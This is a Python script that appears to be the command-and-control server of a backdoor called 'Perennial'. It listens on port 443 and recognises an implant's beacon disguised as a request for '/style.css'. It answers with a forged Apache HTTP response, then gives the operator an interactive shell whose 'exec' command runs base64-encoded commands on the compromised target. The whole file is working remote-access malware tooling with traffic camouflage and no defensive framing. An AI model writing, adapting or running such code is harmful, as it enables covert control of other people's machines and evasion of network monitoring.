#!/usr/bin/env python

import re
import sys
import base64
import socket
import argparse
from datetime import datetime

SIZE = 1024
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def ctrl_shell_server(s, PORT):
    print '[+] ({}) Entering control shell'.format(datetime.now())
    conn, addr = s.accept()
    print 'Welcome to psh, the perennial shell!'
    print 'Running `help\' will give you a list of supported commands.'
    while True:
        try:
            inp = raw_input('psh > ')
            if inp == 'exit':
                break
            elif inp == '':
                continue
            elif inp.startswith('help'):
                print 'Commands:\n  exec'
                print '\ntip: run `command -h\' to get the command\'s help'
            elif inp.startswith('exec'):
                if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                    response = ctrl_shell_exec(conn, inp)
                    print response
                else:
                    print 'Execute commands on target.'
                    print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
            else:
                print 'psh: {}: command not found'.format(inp.split()[0])
        except KeyboardInterrupt:
            break
    socksend(conn, 'fin')
    print '[+] ({}) Exiting control shell.'.format(datetime.now())


def ctrl_shell_exec(conn, inp):
    socksend(conn, inp)
    response = base64.b64decode(sockrecv(conn))
    return response


def socksend(s, msg):
    """
        Sends message using socket operating under the convention that the
        first five bytes received are the size of the following message.
    """

    pkg = base64.b64encode(msg)
    pkg_size = '{:0>5d}'.format((len(pkg)))
    pkg = pkg_size + pkg
    sent = s.sendall(pkg)
    if sent:
        raise socket.error('socket connection broken')


def sockrecv(s):
    """
        Receives message from socket operating under the convention that the
        first five bytes received are the size of the following message.
        Returns the message.

        TODO: Under high network loads, it's possible that the initial recv
        may not even return the first 5 bytes so another loop is necessary
        to ascertain that.
    """

    chunks = []
    bytes_recvd = 0
    initial = s.recv(SIZE)
    if not initial:
        raise socket.error('socket connection broken')
    msglen, initial = (int(initial[:5]), initial[5:])
    bytes_recvd = len(initial)
    chunks.append(initial)
    while bytes_recvd < msglen:
        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
        if not chunk:
            raise socket.error('socket connection broken')
        chunks.append(chunk)
        bytes_recvd += len(chunk)
    return ''.join(chunks)


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', PORT))
    s.listen(1)

    print '[+] Perennial server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
    ping = conn.recv(SIZE)
    if not ping:
        raise socket.error('socket connection broken')
    if ping.startswith('GET /style.css HTTP/1.1'):
        conn.send(FAKEOK)
        conn.close()
        try:
            ctrl_shell_server(s, PORT)
        except socket.error:
            print '[!] ({}) Socket error.'.format(datetime.now())
            print '[-] ({}) Perennial terminated.'.format(datetime.now())
            sys.exit(0)
    print '[-] ({}) Perennial terminated.'.format(datetime.now())

if __name__ == '__main__':
    main()
